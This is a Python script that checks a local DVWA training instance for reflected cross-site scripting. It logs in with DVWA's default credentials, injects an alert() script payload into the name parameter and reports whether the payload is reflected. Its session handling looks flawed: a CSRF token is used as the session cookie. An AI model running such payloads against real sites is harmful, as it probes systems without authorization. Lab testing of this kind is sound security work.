from helper_generic_tags import GenericGetTags
import requests
from bs4 import BeautifulSoup as bs

BASE_URL = "http://127.0.0.1:80/DVWA"

VALUES = {
    'username': 'admin',
    'password': 'password',
    'Login':'Login'
}

SCRIPT = "<script>alert('XSS')</script>"

INJECT_DATA = {"name" : SCRIPT, "submit" : "Submit"}


def get_user_token() -> str:
    with requests.Session() as c:
        res = c.get(f"{BASE_URL}/login.php")
        soup = bs(res.text, "html.parser")
        cookie = soup.find_all("input", {"type": "hidden"})
        user_token = cookie[0]["value"]
        return user_token
    

COOKIES_JSON = {
    "PHPSESSID": get_user_token(),
    "security": "low"
}


def get_forms(html_page) -> list:
    soup = bs(html_page, "html.parser")
    forms = soup.find_all("form")
    return list(forms)


def main():
    
    # Pass the login page: "http://127.0.0.1:80/DVWA/index.php"
    session = requests.Session()
    index_page_response = session.get(f"{BASE_URL}/index.php", cookies = COOKIES_JSON)

    # Entering to xss reflected page : "http://127.0.0.1:80/DVWA/vulnerabilities/xss_r"
    xss_r_page = session.get(f"{BASE_URL}/vulnerabilities/xss_r/", cookies=COOKIES_JSON)

    # To see the structure of the data we need to send:
    ls_forms = get_forms(xss_r_page.text)

    # Inserting the data and in put the script in the name filed:
    res = requests.get(f"{BASE_URL}/vulnerabilities/xss_r/", params = INJECT_DATA, cookies = COOKIES_JSON )
    
    # Check i the script saved in the website:
    if SCRIPT in res.text:
        print("Your website is vulnerable to XSS Injection attack!")
    else:
        print("Your website is NOT vulnerable to XSS Injection attack.")




if __name__ == "__main__":
    main()
